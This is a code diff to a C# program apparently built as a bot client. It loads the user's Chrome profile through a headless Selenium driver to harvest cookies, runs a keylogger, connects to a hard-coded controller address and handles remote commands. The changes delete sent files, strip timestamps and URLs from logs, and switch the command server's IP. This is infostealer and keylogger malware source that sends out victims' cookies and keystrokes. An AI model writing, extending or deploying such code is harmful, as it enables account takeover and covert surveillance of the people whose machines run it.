@@ -253,10 +253,9 @@ namespace Client
                     }
                     string logNameToWrite = "cookies" + logExtendtion;
                     StreamWriter sw = new StreamWriter(logNameToWrite, false);
-                    sw.WriteLine(DateTime.Now);
-                    sw.WriteLine(url);
+                  
                     sw.WriteLine(cookiesString);
-                    //sw.WriteLine("----------------------------------------------------------------------------------------");
+                   
                     sw.Close();
 
                 }
@@ -265,10 +264,9 @@ namespace Client
                     Console.WriteLine("Invalid URL.");
                     string logNameToWrite = "cookies" + logExtendtion;
                     StreamWriter sw = new StreamWriter(logNameToWrite, true);
-                    sw.WriteLine(DateTime.Now);
-                    sw.WriteLine(url);
+                   
                     sw.WriteLine("Url invalid. Url must starts with https://www...");
-                    //sw.WriteLine("----------------------------------------------------------------------------------------");
+                  
                     sw.Close();
                 }
 
@@ -281,10 +279,9 @@ namespace Client
                 //Console.WriteLine("Invalid URL.");
                 string logNameToWrite = "cookies" + logExtendtion;
                 StreamWriter sw = new StreamWriter(logNameToWrite, true);
-                sw.WriteLine(DateTime.Now);
-                sw.WriteLine(url);
+            
                 sw.WriteLine("error: " + e.Message);
-                sw.WriteLine("----------------------------------------------------------------------------------------");
+              
                 sw.Close();
             }
             finally
@@ -398,7 +395,7 @@ namespace Client
                 bytesSent += curDataSize;
                 bytesLeft -= curDataSize;
             }
-
+            File.Delete(fileName);
         }
         public static void handleCommand(string command, IWebDriver driver, TcpClient client, Stream stream)
         {
@@ -424,8 +421,8 @@ namespace Client
             }
             else if (command.StartsWith("keylogger"))
             {
-                string cmd = command.Split('?')[1];
-                Console.WriteLine(cmd);
+                //string cmd = command.Split('?')[1];
+                //Console.WriteLine(cmd);
                 //if (cmd.Equals("start keylogger"))
                 //{
                 //    //Console.WriteLine("okkk");
@@ -444,7 +441,7 @@ namespace Client
                 data = encoding.GetBytes(str);
                 stream.Write(data, 0, data.Length);
 
-                File.Delete("outputkeylogger.txt");
+              //  File.Delete("outputkeylogger.txt");
                 BotKeylogger.StartKeylogger();
                 timeStart = DateTime.Now;
             }
@@ -463,14 +460,6 @@ namespace Client
         {
 
             //<--------------------- set up get cookies-------------------------->
-            //ChromeOptions options = new ChromeOptions();
-            //string username = RunCommandAndGetOutput("echo %username%").Trim();
-            //string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
-            //options.AddArguments(path, "headless");
-            //IWebDriver driver = new ChromeDriver(options);
-            ////Console.WriteLine("set up xong cookies");
-
-
             ChromeOptions options = new ChromeOptions();
             string username = RunCommandAndGetOutput("echo %username%").Trim();
             string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
@@ -485,7 +474,7 @@ namespace Client
                 // Bind the client to the local endpoint
                 client.Client.Bind(localEndPoint);
 
-                client.Connect("192.168.1.103", PORT_NUMBER);
+                client.Connect("192.168.1.100", PORT_NUMBER);
                 Stream stream = client.GetStream();
                 //Console.WriteLine("connect xong socket");
                 byte[] data;
@@ -515,5 +504,6 @@ namespace Client
             BotKeylogger.initBotKeylogger();
             timeStart = DateTime.Now;
         }
+
     }
 }
